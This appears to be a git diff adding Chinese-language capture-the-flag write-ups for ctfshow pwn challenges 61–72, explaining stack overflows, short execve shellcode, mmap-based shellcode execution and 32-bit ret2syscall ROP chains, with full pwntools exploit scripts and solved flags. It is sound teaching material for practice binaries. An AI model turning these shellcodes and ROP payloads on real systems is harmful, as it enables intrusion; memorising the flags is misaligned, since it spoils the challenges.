@@ -4449,45 +4449,299 @@ ctfshow{041a1b38-db5f-4137-9ccd-034ecb587b3b}
 
 ![image-20241102180346353](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241102180346353.png)
 
-可以发现，它有打印v5的地址
+可以发现，它有打印v5的地址，直接溢出然后shellcode写到v5去
+
+栈地址
+
+```
+-0000000000000010 var_10          dq ?
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+```
+
+`0x10 + 0x08` 
+
+但是不能只这样子做，因为看汇编代码可以发现：
+
+![image-20241106160640095](../_media/image-20241106160640095.png)
 
 
 
-那这样简单，直接溢出然后shellcode写到v5去
+最后面有一个leave，说明返回之后栈上空间的数据都会发生改变，所以要返回地址要 `栈地址+32(24+ret的8字节)`
 
 
 
+可以看到打印的v5的地址大小如下：14位
+
+```
+Welcome to CTFshow!
+What's this : [0x7ffc5c6f14f0] ?
+```
 
 
 
+但是要溢出到v5外，所以再来一遍就可以了
 
 
 
+exp：
 
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28280
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+shellcode = asm(shellcraft.sh())
+
+r.recvuntil(b"What's this : [")
+v5=int(r.recv(14),16)
+
+r.recvuntil("But how to use it?\n")
+
+payload= b"a"*(0x10 + 0x08) + p64( v5 + (0x10+0x08) + 0x08 ) + shellcode
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+
+
+flag：
+
+```
+ctfshow{52772a53-fe51-4b20-a64c-f10aec60a8c4}
+```
 
 
 
 ## 62. pwn62
 
+短了一点
+
+![image-20241106162140281](../_media/image-20241106162140281.png)
+
+
+
+main函数还是一样
+
+但是对输入的buf进行了限制，最大长度限制为56 也就是0x38
+
+
+
+栈上地址还是
+
+`0x10 + 0x08`
+
+还是照常的PIE保护开启
+
+可以尝试，使用上一个代码进行尝试，发现发送的是0x51的长度，并不适合这种情况
+
+我们可以单独打印一下shellcraft模块生成的sh来看一下
+
+发现它一个就要48bytes
+
+```
+b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
+48
+```
+
+所以本题不适用shellcraft模块进行
 
 
 
 
-## 63. pwn63
+
+这里使用网上的shellcode，大伙可以搜集一下更多的更短的shellcode，这样后续打的时候就方便了
+
+```
+shellcode =b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
+```
+
+这里找了一个比较短的，22bytes
+
+
+
+可以看到构造的payload总共0x37 长度   所以是可以满足的，并且这个题目出的刚刚好，限制为0x38
+
+
+
+直接exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28196
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
+
+print(shellcode)
+print(len(shellcode))
+r.recvuntil(b"What's this : [")
+v5=int(r.recv(14),16)
+
+r.recvuntil("But how to use it?\n")
+
+payload= b"a"*(0x10 + 0x08) + p64( v5 + (0x10+0x08) + 0x08 ) + shellcode
+
+r.sendline(payload)
+
+r.interactive()
+```
 
 
 
 
 
-## 64. pwn64
+flag：
+
+```
+ctfshow{e42a60d7-a579-424f-90de-0ac7aff9fd4c}
+```
 
 
 
 
 
-## 65. pwn65
+## ==63. pwn63（64位短shellcode）==
+
+又短了一点
+
+还是一样的情况，这里就不放check图了，减少rongyu
 
 
+
+ida查看main函数发现一个read，就短了0x01，限制为0x37
+
+
+
+刚刚pwn62已经算出来payload长度为0x37，所以刚刚好，还可以用，还是一样的exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28202
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
+
+print(shellcode)
+print(len(shellcode))
+r.recvuntil(b"What's this : [")
+v5=int(r.recv(14),16)
+
+r.recvuntil("But how to use it?\n")
+
+payload= b"a"*(0x10 + 0x08) + p64( v5 + (0x10+0x08) + 0x08 ) + shellcode
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+
+
+flag：
+
+```
+ctfshow{460a6455-350e-4a92-a9b0-bcf10698bbaf}
+```
+
+
+
+## 64. pwn64（mmap映射函数）
+
+有时候开启了某种保护并不代表这条路走不通
+
+这道题就真得贴check了
+
+![image-20241106164824809](../_media/image-20241106164824809.png)
+
+
+
+看这里开启了nx保护，防止恶意代码在数据存储区域（堆栈）中被执行
+
+
+
+核心代码：
+
+![image-20241106165201671](../_media/image-20241106165201671.png)
+
+这里调用了一个 mmap函数 ，进行内存映射，并且其有执行权限prot为（7），将其地址给 buf，后面调用 read 函数可以写入数据到 buf，当 read>0 时就会执行 buf
+
+
+
+所以这里直接往buf里面写shellcode就可以了
+
+
+
+exp如下：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='i386',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28300
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+shellcode = asm(shellcraft.sh())
+
+r.recvuntil(b"Some different!")
+
+payload= shellcode
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+
+
+flag：
+
+```
+ctfshow{21afaaa9-2944-4deb-a422-13387bb685b5}
+```
+
+
+
+## ==65. pwn65（无法F5未完成）==
+
+你是一个好人
+
+![image-20241106170040261](../_media/image-20241106170040261.png)
+
+
+
+
+
+ida反汇编不了，那就直接看汇编代码吧
 
 
 
@@ -4523,13 +4777,280 @@ ctfshow{041a1b38-db5f-4137-9ccd-034ecb587b3b}
 
 
 
-## 71. pwn71
+## ==71. pwn71（32位ret2syscall）==
+
+
+
+check一下，32位开了nx
+
+
+
+所谓的ret2syscall就是将某些寄存器设置为特殊的值，这是后会触发特殊的语句，在这里我们把对应获取shell的系统调用的参数放在相应的寄存器中，那么执行int 0x80就可以执行对应的系统调用。
+
+如：
+
+```
+execve("/bin/sh",NULL,NULL)
+```
+
+- 系统调用号，即 eax 应该为 0xb，因为是execve所以是0xb
+- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+- 第二个参数，即 ecx 应该为 0
+- 第三个参数，即 edx 应该为 0
 
 
 
 
 
-## 72. pwn72
+首先还是无限制的gets v4
+
+栈上空间
+
+```
+-00000064                 db ? ; undefined
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
+```
+
+但是发现ida偏移量还是不太准，这里gdb调试用cyclic进行测试，发现偏移是112，也就是0x70，并不是0x64+0x04
+
+![image-20241106175544532](../_media/image-20241106175544532.png)
+
+由于是ret2syscall
+
+
+
+所以直接找init 0x80  ，有的话可以顺带查找一下/bin/sh
+
+![image-20241106175901813](../_media/image-20241106175901813.png)
+
+可以看到
+
+int 0x80地址为   
+
+```
+0x08049421
+```
+
+ida里面具体汇编为：
+
+![image-20241106180237151](../_media/image-20241106180237151.png)
+
+
+
+/bin/sh字符串地址为：
+
+```
+0x080be408
+```
+
+
+
+再找eax和ebx的地址传参
+
+![image-20241106180500789](../_media/image-20241106180500789.png)
+
+可以得出eax的地址为
+
+```
+0x080bb196
+```
+
+
+
+
+
+再找pop3ret1的地址：
+
+![image-20241106180651143](../_media/image-20241106180651143.png)
+
+```
+0x0806eb90
+```
+
+
+
+![1730898065391](../_media/1730898065391.png)
+
+最终exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='i386',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28228
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+binsh=0x080be408
+
+int80_addr=0x08049421
+
+eax_addr=0x080bb196
+
+pop3ret1=0x0806eb90
+
+payload=b"a"*(0x70)+p32(eax_addr)+p32(0xb)+p32(pop3ret1)+p32(0)+p32(0)+p32(binsh)+p32(int80_addr)
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+
+
+flag：
+
+```
+ctfshow{9bbcd2d9-657c-43cd-8d3b-0b0d965dbdd4}
+```
+
+
+
+
+
+## 72. pwn72（多系统函数）
+
+接着练ret2syscall，多系统函数调用
+
+
+
+还是32位，还是nx保护
+
+
+
+main函数如下：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+10h] [ebp-20h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("CTFshow-PWN");
+  puts("where is my system?");
+  gets(&v4);
+  puts("Emmm");
+  return 0;
+}
+```
+
+
+
+安全起见还是gdb算偏移量
+
+![image-20241106210732039](../_media/image-20241106210732039.png)
+
+
+
+
+
+像上一题做法一样搜索int80
+
+发现有，
+
+但是搜索/bin/sh字符串并没有结果，所以设想调用puts或者read来进行写
+
+![image-20241106211021232](../_media/image-20241106211021232.png)
+
+
+
+`实际中发现找到的这个int80并不可以使用，因为没有返回ret，所以无法被利用，进入ida里面找`
+
+```
+int     80h
+int     80h
+中间一共5个空格，一个都不能少！或者你可以直接搜索80h，一个个看吧
+```
+
+
+
+然后int 80h也是有很多的
+
+![image-20241106215947718](../_media/image-20241106215947718.png)
+
+选择
+
+```
+int80_addr = 0x0806F350
+```
+
+然后分别
+
+![image-20241106212728155](../_media/image-20241106212728155.png)
+
+
+
+pop3ret1、eax
+
+```
+pop3ret1 = 0x0806ecb0
+eax_addr = 0x080bb2c6
+```
+
+
+
+ida里面查看rodata开始能够写进去的地址
+
+![image-20241106213649679](../_media/image-20241106213649679.png)
+
+```
+.rodata:080BE528 aCtfshowPwn     db 'CTFshow-PWN',0      ; DATA XREF: main+53↑o
+.rodata:080BE534 aWhereIsMySyste db 'where is my system?',0
+```
+
+32位系统调用号：
+
+\#define __NR_read 3
+
+只需要记住常用的就可以了，其他的上博客找！
+
+read3，execve 11
+
+所以exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='i386',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28276
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+bss_addr = 0x080EAF85
+
+int80_addr = 0x0806F350
+
+eax_addr = 0x080bb2c6
+
+pop3ret1 = 0x0806ecb0
+
+payload=b"a"*(44)+p32(eax_addr)+p32(0x3)+p32(pop3ret1)+p32(0x100)+p32(bss_addr)+p32(0)+p32(int80_addr)
+payload+=p32(eax_addr)+p32(0xb)+p32(pop3ret1)+p32(0)+p32(0)+p32(bss_addr)+p32(int80_addr)
+
+
+r.sendline(payload)
+
+r.sendline('/bin/sh\x00')
+r.interactive()
+```
+
+
+
+flag：
+
+```
+ctfshow{c1c089b0-9c87-4544-a399-21c68a39a476}
+```
 
 
 
@@ -5922,3 +6443,18 @@ cyclic -l 一个无效地址
 // 得到真正的偏移量
 ```
 
+
+
+
+
+
+
+ret2text
+
+ret2shellcode
+
+ret2syscall
+
+那么ret2text——程序中有system("/bin/sh")代码段，控制流执行
+那么ret2shellcode——程序中不存在system("/bin/sh/")的代码段，自己恶意填入代码并在可执行段执行 
+那么ret2syscall——程序中不存在system("/bin/sh/")的代码段，不存在合适的可执行段进行恶意代码的执行，但是程序是静态链接，且程序中中存在代码片段，拼接可组成系统调用 
